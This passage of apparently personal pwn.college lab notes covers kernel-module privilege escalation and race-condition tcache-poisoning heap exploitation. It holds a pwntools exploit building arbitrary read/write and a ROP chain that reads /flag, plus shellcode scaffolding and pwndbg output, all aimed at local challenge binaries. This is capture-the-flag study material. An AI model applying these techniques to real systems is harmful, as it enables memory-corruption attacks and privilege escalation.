class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;...&quot;</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-number">264</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memcpy</span>(test.buf, shellcode, <span class="hljs-number">256</span>);<br>    test.addr = (<span class="hljs-keyword">void</span>*)...;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, &amp;test, <span class="hljs-number">264</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="level10-5"><a href="#level10-5" class="headerlink" title="level10"></a>level10</h4><p>I cannot figure out the difference between this and previous level…..</p><h4 id="level11-5"><a href="#level11-5" class="headerlink" title="level11"></a>level11</h4><p>have user land program with seccomp constraint(write). </p><p>and the pwncollege proc <strong>cannt be read</strong> by user:hacker. we can use write to do privilege escalation.</p><h4 id="level12-3"><a href="#level12-3" class="headerlink" title="level12"></a>level12</h4><p>first fork a child to read the flag into bss segment, then delete the flag.<br>Next read shellcode which can only use write syscall.<br>the shellcode use write() to communicate with pwncollege kernel module for privilege escalation purpose.<br>then use write() to print out the bss segment content.</p><h1 id="module-E-advance"><a href="#module-E-advance" class="headerlink" title="module E-advance"></a>module E-advance</h1><h4 id="key-point-1"><a href="#key-point-1" class="headerlink" title="key point:"></a>key point:</h4><ul><li>Core concept: security checks that do not properly use mutexes are ineffective in a multithreaded environment!</li><li>keeps track of what do you know about the process and the program, what do you need to know, what you can do.</li><li><strong>Problem:</strong> we lack knowledge of:<ul><li>PIE base (binary address)</li><li>ASLR base (library addresses)</li><li>Stack base</li><li>Heap base</li><li>Canary</li></ul></li><li>may be a plan:<ol><li>Leak address of tcache_perthread_struct.</li><li>Compute address of pointer to main_arena.</li><li>Leak address of main_arena in libc’s BSS.</li><li> Compute libc base address.</li><li>Compute a thread stack address.</li><li>Leak the canary and overflow the stack or Overwrite the return address with a ropchain!</li></ol></li><li>first: heap base, via tcache poisoning.<ul><li>use race condition showed in the vedio, interleave <code>free</code> with <code>write</code>.</li></ul></li><li>When previous work is done, we get one address in per thread tcache memory. then by gdb it we can find the main_areana pointer in the same memory region. Then we have all threads <strong>heap metadata+libc base address</strong>.</li><li>Exploit Primitives:<ul><li>the building block of complex exploitation:<br>arbitrary read, arbitrary write, arbitrary call. or controlled ones.</li><li>the slides demonstrate an exp example of multithread message storing service.</li><li>use wrapped code for reuse intention.</li><li>some gotchas: <ul><li>corrupted heap metadata: start a new connection</li><li>burned bridges(pointer to not a valid heap chunk): avoid newly non-viable code paths.</li></ul></li></ul></li><li>kernel race:<ul><li>syscalls, file access, interrupts can be triggered simultaneously.</li><li>prevention and recent situation in <a href="https://docs.google.com/presentation/d/16MN3BneO7l16SX_cpvTYlV25nfdRuqfRIRQvV-iURa0/edit#slide=id.gade02eaa21_0_5">SLIDES</a> </li></ul></li></ul><p><b style="color:red">Pivoting Around Memory</b> </p><ul><li>four major parts:<ul><li>The program itself</li><li>The stack</li><li>libc</li><li>The heap</li></ul></li><li>Stack from libc: <code>__libc_argv</code> or <code>environ</code> <ul><li>the <code>environ</code> variable is just a pointer to the env on stack set up by the _start() function(maybe).<br>and the setenv() funtion allocates a chunk on heap for the new string. this function also copies all env strings’ pointer(to stack) to the heap, and add new env pointer to the end of it.lsdfk</li><li>the <code>setenv()</code> copies the string, and the <code>putenv()</code> refers it.</li></ul></li><li>libc from binary: reading GOT entries</li><li>Program base from libc: pivoting through ld<ul><li>libc always contains pointers into <strong>ld</strong> for runtime symbol resolution (in the form of the <strong><code>_dl_runtime_resolve</code></strong> libc GOT entry)</li><li>ld is also practically guaranteed to be at a constant offset from libc</li><li><b>Either way, once the address of ld has been leaked, the <code>name</code> field of the global <code>_dl_rtld_libname</code> struct holds a pointer into the <code>.interp</code> section of the main binary</b> </li></ul></li></ul><img src="../../image/pwn-modules/image-20220621212230967.png" alt="image-20220621212230967" style="zoom:80%;" /><p>e.g.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork() =<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>            <span class="hljs-comment">#这个AAABBB也是细节, 让我纠结到半夜一点多的罪魁祸首.</span><br>            r1.sendline(<span class="hljs-string">&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0&quot;</span>)<br>        os.kill(os.getpid()，<span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        r2.sendline(<span class="hljs-string">&quot;printf 0&quot;</span>)<br>    os.wait()<br>    output = r2.clean()<br>    r1.clean()<br>    leak = pwn.u64(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>，<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br>idx = <span class="hljs-number">1</span><br><span class="hljs-comment">#just as the name, malloc a chunk at the specific address.</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    r1.clean()<br>    r2.clean()<br>    <br>    packed =pwn.p64(addr)<br>    r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&quot;free <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>            os.kill(os.getpid(),<span class="hljs-number">9</span>)<br>r2.send((<span class="hljs-string">b&quot;scanf %d &quot;</span>%idx + packed + <span class="hljs-string">b&quot;\n&quot;</span>)*<span class="hljs-number">2000</span>)<br>         os.wait()<br>         time.sleep(<span class="hljs-number">0.1</span>)<br>         <span class="hljs-comment">#use printf command to check whether the race is win(@packed == content printed out).</span><br>         r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx&#125;</span> printf <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>         r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>         stored = r1.readline()[:-<span class="hljs-number">1</span>]<br>         <span class="hljs-comment">#there maybe an \0 in the address code. if the condition is true, it means the race succeeds.</span><br><span class="hljs-keyword">if</span> stored == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>         <span class="hljs-keyword">break</span><br>r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>r1.clean()<br>idx += <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>r1.sendline(<span class="hljs-string">f&quot;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>    output = r1.readline()[:-<span class="hljs-number">1</span>]<br>    leak = pwn.u64(output[:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>， <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1,，r2，addr , value</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>    r1.send(<span class="hljs-string">b&quot;scanf %d &quot;</span>%(idx-<span class="hljs-number">1</span>) + value + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    p.kill()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br><br>p=pwn.process( <span class="hljs-string">&quot;./ult&quot;</span>)<br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;continue\n&quot;)</span><br><span class="hljs-comment">#time.sleep(1)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/naps&quot;</span> ).read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r3 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CONPUTED: MAIN_ARENA_PTR: &quot;</span> , <span class="hljs-built_in">hex</span>(main_arena_ptr_address))<br>main_arena_address = arbitrary_read(r1，r2, main_arena_ptr_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: MAIN_ARENA: &quot;</span>,<span class="hljs-built_in">hex</span>(nain_arena_address))<br>libc_base = main_arena_address - <span class="hljs-number">0x1ebb80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: LIBC_BASE: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#this is the return address of vuln in thread. thus the *stored* rip.</span><br>stored_rip_address = libc_base - <span class="hljs-number">0x4138</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: STORED_RIP_ADDRESS:&quot;</span>, <span class="hljs-built_in">hex</span>(stored_rip_address))<br>addr_in_binary = arbitrary_read(r1，r2,stored_rip_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: ADDR IN BINARY:&quot;</span>, <span class="hljs-built_in">hex</span>(addr_in_binary))<br>bin_base = addr_in_binary - <span class="hljs-number">0x172f</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: BINARY BASE: &quot;</span>, <span class="hljs-built_in">hex</span>(bin_base))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!!!!! LET&#x27;S ROLLING !!!!!!&quot;</span>)<br><span class="hljs-comment">#new technique</span><br>libc = p.elf.libc<br>libc.address = libc_base<br>pwn.context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\xoc\xod\xoe\x20&quot;</span>)<br>rop.call( <span class="hljs-string">&quot;close&quot;</span>,[<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call( <span class="hljs-string">&quot;read&quot;</span>，[<span class="hljs-number">0</span>,libc.bss(<span class="hljs-number">0x123</span>)，<span class="hljs-number">42</span>])<br>rop.call( <span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>)，<span class="hljs-number">0</span>])<br>rop.call( <span class="hljs-string">&quot;sendfile&quot;</span>，[<span class="hljs-number">1</span>，<span class="hljs-number">3</span>，<span class="hljs-number">0</span>，<span class="hljs-number">1024</span>])<br>rop.call( <span class="hljs-string">&quot;exit&quot;</span>,[<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1，r2，stored_rip_address, rop.chain())<br>r1.sendline( <span class="hljs-string">&quot;quit&quot;</span>)<br>p.send( <span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure><p>finally, i come to the last module level.</p><h4 id="level1-4"><a href="#level1-4" class="headerlink" title="level1"></a><del>level1</del></h4><p>emmmmmm, i thought i have to write the script above by my own hand.</p><p>failed to test the above program in kali2021, maybe the source code of tache is changed.</p><p>Ohhhhhh, i forget the thread local var is in high address space, so the tcache contains ‘\x7f’.</p><p>we can get the constant offset of libc and thread tcache address(0x7f44ac0008d0):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#print the content of the chunk.</span><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx <span class="hljs-number">0x7f44ac000f20</span><br><span class="hljs-number">0x7f44ac000f20</span>: <span class="hljs-number">0x00000007f44ac000</span>      <span class="hljs-number">0x00007f44ac0008d0</span><br><span class="hljs-number">0x7f44ac000f30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></div></td></tr></table></figure><img src="../../image/pwn-modules/image-20220603165348772.png" alt="image-20220603165348772" style="zoom:80%;" /><p>we can notice that the first 8 bytes of the chunk is 0x00007f44ac000, which is not a valid high layout address. because libc 2.33 uses a newer technique: PROTECT_PTR macro. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  <span class="hljs-comment">//and one line difference in tcache_put()!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>the server is using libc-2.31, which matches with ubuntu20.04. and this version doesn’t have PROTECT_PTR macro.</p><p>the result on my kali2021 is:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#this is tcache next pointer(with padded address)</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x00000007f44ac000000</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7f44ac000000</span>     <span class="hljs-number">0x7f44ac021000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap <span class="hljs-number">3</span>:<span class="hljs-number">1</span>] +<span class="hljs-number">0x0</span><br><span class="hljs-meta">#this is tcache struct</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x00007f44ac0008d0</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7f44ac000000</span>     <span class="hljs-number">0x7f44ac021000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap <span class="hljs-number">3</span>:<span class="hljs-number">1</span>] +<span class="hljs-number">0x8d0</span><br></code></pre></div></td></tr></table></figure><p>we continue to check the content of address 0x00007f44ac0008d0 to look up for libc-based address, which is appeal to us.</p><blockquote><p>by <code>x/512gx 0x00007f44ac0008d0</code>, we can found the useful addresses in higher space than heap. just take one. and use the offset among known addresses to calc more addresses.</p></blockquote><p>Okay, the beginning of the heap stores some infomation containing a pointer to main_arena. so we should use <code>x/512gx 0x00007f44ac000000</code>, which is page-aligned version of previous one.</p><p>then we can find this:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">in founded address:<br><span class="hljs-comment">/*0x7f055c000880: 0x0000000000000000      0x0000000000000000*/</span>     <br># <span class="hljs-number">0x7f055c000890</span>: <span class="hljs-number">0x00007f0563ef5ba0</span>      <span class="hljs-number">0x0000000000000000</span>      <br><span class="hljs-comment">/*0x7f055c0008a0: 0x0000000000000001      0x0000000000021000*/</span><br><span class="hljs-keyword">and</span> in maps:<br><span class="hljs-comment">/*  0x7f0563d38000     0x7f0563d5e000 r--p    26000 0      /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563d5e000     0x7f0563ea6000 r-xp   148000 26000  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563ea6000     0x7f0563ef1000 r--p    4b000 16e000 /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563ef1000     0x7f0563ef2000 ---p     1000 1b9000 /usr/lib/x86_64-linux-gnu/libc-2.33.so*/</span><br>#   <span class="hljs-number">0x7f0563ef2000</span>     <span class="hljs-number">0x7f0563ef5000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">1b</span>9000 /usr/lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.33</span>.so<br><span class="hljs-comment">/*  0x7f0563ef5000     0x7f0563ef8000 rw-p     3000 1bc000 /usr/lib/x86_64-linux-gnu/libc-2.33.so*/</span><br></code></pre></div></td></tr></table></figure><p>These two are perfectly matched. and now we find the main_arena’s address.</p><h4 id="level1-5"><a href="#level1-5" class="headerlink" title="level1"></a>level1</h4><p>the additional command is send_flag, which calls <code>load_secret()</code> and <code>strcmp()</code> to check whether the pwd is correct. the answer is a randomized string taking the flag as seed.  wont change between runnings. </p><p>in this level, the pwd is stored into bss segment in main function.</p><blockquote><p><strong>Thinking process:</strong> </p><p>we must leak the pwd through arbitrary read, and before the read we should also get the stack pointer of some stack frame.</p><p>and the secret_correct’s stack frame base is a constant offset by libc base which is 0x4640 in my kali2021. the pwd is stored in <code>ebp-0x20</code>, and  the length is 16 bytes.</p><p>but secret_correct() has stack reuse protection: <code>memset(s2, 0, 0x11uLL)</code> to set pwd string to NULL.</p><p>emmmm………………….. should i try a race to read pwd before he clears out the PWD s2? I think not. </p><p>I can <strong>change the return address</strong> of <code>challenge()</code> to <code>win()</code> after using quit command. by using the function’s ebp i can easily locate it.</p></blockquote><p>or, in this level, main function puts the pwd into 0x405655, where we can directly read out from.</p><blockquote><p>wtf, when i try to read the main_arean_addr, the value stored there begins with ‘\x0a’, which means ‘\n’ and will stop printf to print all the rest chars.<br><code>pwndbg&gt; x/8bx 0x00007fbc88000890</code><br><code>0x7fbc88000890: 0xa0    0x9b    0x1a    0x8f    0xbc    0x7f    0x00    0x00</code> </p><p>Okay, that’s beccause i use the recvline, it will stop at the carrige return.</p></blockquote><p>so we should use r1.clean() to receive message.</p><blockquote><p><strong>why would the printf print out the null bytes??????</strong> Im so confused. </p><p>ohhhh, i think i get the point. before the printf prints out a string, it will check the string length by locating the null byte. and then it will call the write syscall to prints out all bytes(such as null byte).  but in race condition, with previously filled AAAAAAAABBBBBBBB, after passing the length check, now printf is scheduled to free.  then the ‘string’ is a tcache_perthread_ptr, the write syscall will directly prints it out.</p></blockquote><p><del>but we can’t read the null byte in, nor the white characters</del>.<b style="color:red">we can scanf null bytes into the buffer. the scanf simply adds a \0 to the end of the string, without checking whether there are null bytes in it </b>. what a surprise.</p><p><strong>Again, i forgot the libc version on my kali is 2.33. stucked in why tcache poisoning don’t work, neglected the PROTECT_PTR macro.</strong> </p><p>but i figure out that the chunk 0 is at a constant offset from the tcache_perthread_struct address, which is 0x650. the tcache link at the end of controlled_allocation is like this: <code>tcache_entry[i]-&gt;chunk_0-&gt;packed address</code> </p><img src="../../image/pwn-modules/image-20220619123546515.png" alt="image-20220619123546515" style="zoom:80%;" /><p>and what we all need is addr(@packed) and chunk0 addr(now we get it), and then perform calc like this: <code>(addr&gt;&gt;12)^packed</code>. </p><p>but the second time using arbitrary read it says: <code>malloc(): unaligned tcache chunk detected</code> , that’s because the target 0x405655 is not aligned with 16 bytes in x86-64 machine. however, using 0x405650 as string start address will encounter the problem that it starts with the null bytes.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> x/21bc 0x405650</span><br>0x405650 &lt;secret+80&gt;:   0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 109 &#x27;m&#x27; 108 &#x27;l&#x27; 116 &#x27;t&#x27;<br>0x405658 &lt;secret+88&gt;:   122 &#x27;z&#x27; 102 &#x27;f&#x27; 118 &#x27;v&#x27; 114 &#x27;r&#x27; 102 &#x27;f&#x27; 113 &#x27;q&#x27; 103 &#x27;g&#x27; 106 &#x27;j&#x27;<br>0x405660 &lt;secret+96&gt;:   120 &#x27;x&#x27; 118 &#x27;v&#x27; 107 &#x27;k&#x27; 112 &#x27;p&#x27; 101 &#x27;e&#x27;<br></code></pre></div></td></tr></table></figure><p>so we could use arbitrary_write() to change address stored in message[2], and <del>only need to change the last byte</del>. scanf will read in null byte, so it needs full address to be packed.</p><p>finally, i use this plan(as follows). change the message’s content to another place where we want to overwrite. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">r1.sendline(<span class="hljs-string">b&#x27;malloc 2&#x27;</span>) <span class="hljs-comment">#make sure it exists.</span><br>arbitrary_write(r1, r2, <span class="hljs-number">0x405220</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">0x405655</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;printf 2&#x27;</span>) <span class="hljs-comment">#print it out.</span><br>r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>pwd = r1.clean() <span class="hljs-comment">#finally we get the pwd.</span><br><span class="hljs-built_in">print</span>(<span 